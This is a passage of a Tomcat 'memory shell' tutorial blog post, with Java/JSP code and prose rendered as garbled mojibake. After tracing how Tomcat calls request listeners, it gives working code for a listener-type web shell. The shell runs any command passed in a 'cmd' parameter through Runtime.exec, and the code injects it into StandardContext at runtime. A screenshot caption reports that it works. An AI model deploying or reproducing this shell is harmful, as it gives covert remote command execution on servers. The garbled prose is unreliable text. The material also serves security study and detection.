</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">lifecycleListener</span> <span class="k">instanceof</span> <span class="n">ServletContextListener</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">noPluggabilityListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">lifecycleListener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">setApplicationLifecycleListeners</span><span class="o">(</span><span class="n">lifecycleListeners</span><span class="o">.</span><span class="na">toArray</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ok</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>Ëá≥Ê≠§ListenerÂ∑≤ÁªèÂú®TomcatÊ≥®ÂÜåÂÆåÊØïÔºåÊé•‰∏ãÊù•Â∞±ÊòØÂÖ∑‰ΩìÁöÑË∞ÉÁî®„ÄÇ <!-- raw HTML omitted --></p>
<h4 id="tomcatË∞ÉÁî®">TomcatË∞ÉÁî®</h4>
<p>Êàë‰ª¨Êâì‰∏äÊñ≠ÁÇπÊù•Áúã‰∏Ä‰∏ãË∞ÉÁî®Ê†àÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_10-22-56_screenshot.png"
         alt="Figure 5: requestInitialized()ÁöÑË∞ÉÁî®Ê†à" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 5: <!-- raw HTML omitted -->requestInitialized()ÁöÑË∞ÉÁî®Ê†à</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>Ëá™‰∏ãËÄå‰∏äÁöÑÊñπÊ≥ïË∞ÉÁî®Áõ∏‰ø°Â§ßÂÆ∂ÈÉΩÂæàÁÜüÊÇâ‰∫ÜÔºåÂ∞±ÊòØÈÄöËøáTomcatÁöÑ <strong>Pipeline-Valve</strong> Ë¥£‰ªªÈìæÔºå‰∏çÊñ≠Ë∞ÉÁî®invokeÊù•Â∞ÜËØ∑Ê±ÇÂú®Â≠êÂÆπÂô®‰∏≠‰º†ÈÄíÔºõ <!-- raw HTML omitted --></p>
<p>Êàë‰ª¨ÈáçÁÇπÂÖ≥Ê≥®ÊúÄÂêé‰∏â‰∏™ÊñπÊ≥ïÔºö <!-- raw HTML omitted --></p>
<p>StandardHostValve#invoke()ÊñπÊ≥ïÔºö <!-- raw HTML omitted --></p>
<ol>
<li>StandardHostÂÖàÊâæÂà∞ÂØπÂ∫îÁöÑStandardContextÔºåÂ∞ÜËØ∑Ê±Ç‰º†ÈÄí‰∏ãÂéªÔºõ <!-- raw HTML omitted --></li>
<li>Êé•ÁùÄË∞ÉÁî®StandardContextÁöÑfireRequestDestroyEvent()ÔºåÈÄöÁü•StandardContextÊúâ‰∏Ä‰∏™Êñ∞Âª∫request‰∫ã‰ª∂ÂèëÁîü‰∫ÜÔºõ <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">request</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">isAsyncSupported</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">asyncAtStart</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">isAsync</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(!</span><span class="n">response</span><span class="o">.</span><span class="na">isErrorReportRequired</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">context</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">getFirst</span><span class="o">().</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(!</span><span class="n">request</span><span class="o">.</span><span class="na">isAsync</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">asyncAtStart</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">fireRequestDestroyEvent</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getRequest</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>StandardContext#fireRequestInitEvent()Ôºö <!-- raw HTML omitted --></p>
<ol>
<li>Ëé∑ÂèñÊàë‰ª¨‰πãÂâçÂú®TomcatÂêØÂä®Êó∂‰øùÂ≠òÂú®StandardContextÂÆû‰æã‰∏≠ÁöÑÊâÄÊúâ <strong>applicationEventListeners</strong>; <!-- raw HTML omitted --></li>
<li>Êé•ÁùÄÈÅçÂéÜÊâÄÊúâÁöÑListenersÔºåÊâæÂà∞ÊâÄÊúâÁöÑ <code>ServletRequestListener</code>,Ëß¶ÂèëÁõëÂê¨Âô®ÁöÑÊñπÊ≥ïÔºö <code>requestInitialized()</code>; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">fireRequestInitEvent</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Object</span><span class="o">[]</span> <span class="n">instances</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getApplicationEventListeners</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">instances</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">instances</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ServletRequestEvent</span> <span class="n">event</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServletRequestEvent</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">(),</span> <span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">instances</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="k">instanceof</span> <span class="n">ServletRequestListener</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletRequestListener</span> <span class="n">listener</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestListener</span><span class="o">)</span><span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listener</span><span class="o">.</span><span class="na">requestInitialized</span><span class="o">(</span><span class="n">event</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var7</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">ExceptionUtils</span><span class="o">.</span><span class="na">handleThrowable</span><span class="o">(</span><span class="n">var7</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="o">.</span><span class="na">getLogger</span><span class="o">().</span><span class="na">error</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardContext.requestListener.requestInit&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()}),</span> <span class="n">var7</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;javax.servlet.error.exception&#34;</span><span class="o">,</span> <span class="n">var7</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>ÊúÄÂêéÊàë‰ª¨Ëá™ÂÆö‰πâÁöÑListenerÁ±ª‰∏≠ÁöÑ <code>requestInitialized()</code> Â∞±Âæó‰ª•ÂÆûÁé∞‰∫Ü„ÄÇ <!-- raw HTML omitted --></p>
<h3 id="ÊûÑÈÄ†listenerÂÜÖÂ≠òÈ©¨">ÊûÑÈÄ†ListenerÂÜÖÂ≠òÈ©¨</h3>
<p>ÈÄöËøá‰∏äÈù¢ÁöÑListenerË¢´Ë∞ÉÁî®ÊÉÖÂÜµÔºåÊàë‰ª¨Áü•ÈÅìÂØπ‰∫éÊØè‰∏Ä‰∏™Êñ∞ÁöÑËØ∑Ê±ÇÔºåTomcatÈÉΩ‰ºöËß¶Âèë <code>fireRequestInitEvent()</code> ‰∫ã‰ª∂ÔºåËøõËÄåÈÄöËøá <code>StandardContext#getApplicationEventListeners()</code> ÊâæÂá∫Ê≥®ÂÜåÂú®StandardContextÂÆû‰æã‰∏≠ÁöÑ <code>ServletRequestListener()</code>, ÊúÄÁªàË∞ÉÁî®ÂÖ∂‰∏≠ÂÆö‰πâÁöÑ <code>requestInitialized()</code> ÊñπÊ≥ï„ÄÇ <!-- raw HTML omitted --></p>
<p>Ê†πÊçÆËøô‰∏™ÊÄùË∑ØÔºåÊàë‰ª¨Â¶ÇÊûúÊÉ≥Ë¶ÅÂú®TomcatÂêØÂä®‰πãÂêéÊ≥®ÂÜåËá™ÂÆö‰πâÁöÑListenerÁ±ªÔºå‰ΩøÂÖ∂‰∏≠ÂåÖÂê´ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅË¢´ÊâßË°åÔºåÂè™ÈúÄË¶ÅÂ∞ÜËá™ÂÆö‰πâÁöÑListenerÁöÑÂÆû‰æãÊ∑ªÂä†Âà∞StandardContext‰∏≠ÁöÑÊàêÂëòÂèòÈáè <code>applicationEventListenersList</code> ‰∏≠Â∞±ÂèØ‰ª•‰∫Ü„ÄÇ <!-- raw HTML omitted --></p>
<ol>
<li>
<p>ÊûÑÂª∫‰∏Ä‰∏™ListenerÂÆûÁé∞ServletRequestListenerÊé•Âè£ÔºåÂπ∂‰∏îÈáçÂÜô <code>requestInitialized</code> ÊñπÊ≥ïÔºåÂÆûÁé∞ÊÅ∂ÊÑè‰ª£Á†ÅÔºõ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellListener</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServletRequestListener</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">requestInitialized</span><span class="o">(</span><span class="n">sre</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">RequestFacade</span> <span class="n">requestFacade</span> <span class="o">=</span> <span class="o">(</span><span class="n">RequestFacade</span><span class="o">)</span> <span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">requestFacadeField</span> <span class="o">=</span> <span class="n">requestFacade</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">requestFacadeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestFacadeField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">requestFacade</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">requestFacade</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>Ëé∑ÂèñStandardContextÂÆû‰æãÔºõ <!-- raw HTML omitted --></p>
<ul>
<li>ËøôÈáåÂå∫Âà´‰∫éÊàë‰ª¨Âú®StandardFilter‰∏≠‰ΩøÁî®ÁöÑÊñπÊ≥ïÔºåÊòØ‰∏ÄÁßçÊñ∞ÁöÑÊÄùË∑ØÔºõ <!-- raw HTML omitted --></li>
<li>ÂÖ∂ÂÆûÊàë‰ª¨Âú®JSP‰∏≠Ëé∑ÂæóÁöÑrequestÈÉΩÊòØ <strong>RequestFacade</strong> Èó®Èù¢Á±ªÁöÑÂÆû‰æãÔºå‰ªé‰∏≠ÊãøÂà∞RequestÁöÑÂÆû‰æã‰πãÂêéÂ∞±ÂèØ‰ª•Áõ¥Êé•ÊãøÂà∞StandardContextÁöÑÂÆû‰æãÔºõ <!-- raw HTML omitted --></li>
<li>Â∞±‰∏çÁî®ÂÜçÂÉè‰πãÂâç‰πü‰∏ÄÊ†∑Â•óÈÇ£‰πàÂ§öÂ±Ç‰∫ÜÔºõ <!-- raw HTML omitted --></li>
</ul>
</li>
<li>
<p>Ë∞ÉÁî®StandardContext#addApplicationListener()ÊñπÊ≥ïÂ∞ÜËá™ÂÆö‰πâÁöÑListenerÁ±ªÊ≥®ÂÜåÂà∞StandardContextÁöÑÂÆû‰æã‰∏≠Ôºõ <!-- raw HTML omitted --></p>
<ul>
<li>ÈÇ£‰πà‰πãÂêéTomcatÂú®Êî∂Âà∞ËØ∑Ê±Ç‰πãÂêéÔºåÂ∞±‰ºöÊåâÁÖßÊàë‰ª¨‰∏äÈù¢‰ªãÁªçÁöÑË∞ÉÁî®Èìæ‰ªé applicationListeners ‰∏≠Á≠õÈÄâÂá∫ÊâÄÊúâÁöÑ <strong>ServletRequestListener</strong>, Âπ∂ÊâßË°å <code>requestInitialized()</code> ÊñπÊ≥ïÊù•ÊâßË°åÊàë‰ª¨ÂÜôÂÖ•ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÔºõ <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">MemShellListener</span> <span class="n">memShellListener</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellListener</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">memShellListener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>ÂêØÂä®TomcatÔºåÊâßË°åMemShellListener.jspÊ≥®ÂÜåÊàë‰ª¨ÁöÑFilterÔºõ <!-- raw HTML omitted --></p>
</li>
<li>
<p>Êé•ÁùÄÂ∏¶ÁùÄ <code>cmd</code> ÂèÇÊï∞ÂèëÂá∫ËØ∑Ê±ÇÔºåListenerÂÜÖÂ≠òÈ©¨Ë¢´Ë∞ÉÁî®ÔºåÊâßË°å‰ª£Á†ÅÊàêÂäüÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_12-06-03_screenshot.png"
             alt="Figure 6: ListenerÂÜÖÂ≠òÈ©¨ÊâßË°åÊàêÂäü" width="700px"/><figcaption>
                <p><!-- raw HTML omitted -->Figure 6: <!-- raw HTML omitted -->ListenerÂÜÖÂ≠òÈ©¨ÊâßË°åÊàêÂäü</p>
            </figcaption>
    </figure>
 <!-- raw HTML omitted --></p>
</li>
</ol>
<p>ÊúÄÂêéË°•ÂÖÖ‰∏Ä‰∏™ËßÅÂà∞ÁöÑÂÜÖÂ≠òÈ©¨‰∏≠‚ÄúÊó†‰∏≠ÁîüÊúâ‚ÄùËé∑ÂèñStandardContextÂÆû‰æãÁöÑÊñπÊ≥ïÔºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="n">WebappClassLoaderBase</span> <span class="n">webappClassLoaderBase</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebappClassLoaderBase</span><span class="o">)</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">webappClassLoaderBase</span><span class="o">.</span><span class="na">getResources</span><span class="o">().</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div><h2 id="servletÂûã">ServletÂûã</h2>
<p>ServletÂ∫îËØ•ÊòØËøô‰∏â‰∏™ÁªÑ‰ª∂ÈáåÂ§ßÂÆ∂ÊúÄÁÜüÊÇâÁöÑ‰∏Ä‰∏™Ôºå‰πüÂ∞±ÊòØTomcatÊúçÂä°Âô®ÁúüÊ≠£Áî®Êù•Êèê‰æõÊúçÂä°ÔºåÂ§ÑÁêÜ‰∏öÂä°ÁöÑÁªÑ‰ª∂„ÄÇ <!-- raw HTML omitted --></p>
<p>ËÄÅËßÑÁü©Êàë‰ª¨ÂÖàÊù•Áúã‰∏Ä‰∏™ÊôÆÈÄöÁöÑServletÊòØÂ¶Ç‰ΩïÂºÄÂèëÔºåÊé•ÁùÄË¢´Âä†ËΩΩÊ≥®ÂÜåÔºå‰ª•ÂèäÊúÄÂêéË¢´Ë∞ÉÁî®ÁöÑ„ÄÇ <!-- raw HTML omitted --></p>
<h3 id="ÂºÄÂèëËá™ÂÆö‰πâservlet">ÂºÄÂèëËá™ÂÆö‰πâServlet</h3>
<h4 id="ÂºÄÂèëservletÁ±ª">ÂºÄÂèëServletÁ±ª</h4>
<p>Êàë‰ª¨ËøôÈáå‰∏∫‰∫ÜËÆ©ServeltÁÆÄÂçï‰∏ÄÁÇπÔºåÂ∞±Áõ¥Êé•ÁªßÊâøServletÊé•Âè£ÔºåËÄå‰∏çÂéªÁªßÊâøHTTPServlet‰∫ÜÔºåÂõ†Ê≠§‰πüÂ∞±ÈúÄË¶ÅÈáçÂÜô‰∏Ä‰∏ã <code>service()</code> ÊñπÊ≥ïÔºö <!-- raw HTML omitted --></p>
<p>Êé•ÁùÄÊàë‰ª¨Ë¶ÅÂéª <code>web.xml</code> ‰∏≠Â∞ÜÂàöÂÜôÂ•ΩÁöÑServletÊ≥®ÂÜåÂà∞ÈÖçÁΩÆ‰∏≠ÔºåÂêåÊó∂ÈÖçÁΩÆÂ•ΩÂØπÂ∫îÁöÑËÆøÈóÆË∑ØÂæÑÔºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;servlet&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;servlet-name&gt;</span>TmpServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;servlet-class&gt;</span>com.example.tomcatmemshell.TmpServlet<span class="nt">&lt;/servlet-class&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/servlet&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;servlet-name&gt;</span>TmpServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;url-pattern&gt;</span>/tmpServlet<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/servlet-mapping&gt;</span>
</span></span></code></pre></div><h4 id="tomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩservletÁ±ª">TomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩServletÁ±ª</h4>
<p>ËøôÊòØÊàë‰ª¨ÁöÑÁ¨¨‰∏â‰∏™ÁªÑ‰ª∂‰∫ÜÔºåÊ≠•È™§Áõ∏‰ø°Â§ßÂÆ∂ÈÉΩÂ∑≤ÁªèÈùûÂ∏∏ÁÜüÊÇâ‰∫ÜÔºåTomcat‰ºö‰ªé <code>web.xml</code> ‰∏≠ËØªÂèñÈúÄË¶ÅÂä†ËΩΩÊ≥®ÂÜåÁöÑ <strong>Servlet</strong> Á±ªÁöÑ‰ø°ÊÅØÔºö <!-- raw HTML omitted --></p>
<p>ConfigureConfigure#configureContext()‰∏≠Ë¶ÅÂ±ûServletÁöÑÈÉ®ÂàÜÊúÄÂ§çÊùÇÔºåÊàë‰ª¨ÈáçÁÇπÂÖ≥Ê≥®Ôºö <!-- raw HTML omitted --></p>
<ol>
<li>ÂàõÂª∫‰∏Ä‰∏™WrapperÂØπË±°Áî®Êù•Â∞ÅË£ÖServletÔºõ <!-- raw HTML omitted --></li>
<li>ËÆæÁΩÆWrapperÁöÑÂêçÂ≠óÔºå‰πüÂ∞±ÊòØServletÁöÑÂêçÂ≠ó <!-- raw HTML omitted --></li>
<li>ËÆæÁΩÆWrapper‰∏≠ÊâÄÂ∞ÅË£ÖÁöÑServletÁöÑÁ±ªÂêçÔºåÊñπ‰æøÂêéÊúüÂÆû‰æãÂåñÔºõ <!-- raw HTML omitted --></li>
<li>Â∞ÜÂàõÂª∫ÁöÑWrapperÂÆû‰æãÊ∑ªÂä†Âà∞StandardContextÁöÑHashmap childrenÂΩì‰∏≠ÂéªÔºõ <!-- raw HTML omitted --></li>
<li>Âä†ËΩΩ&lt;servlet-mapping&gt;ÈÖçÁΩÆÂÜÖÂÆπÔºåÈÖçÂêàServletÊù•ÁîüÊïàÔºõ <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
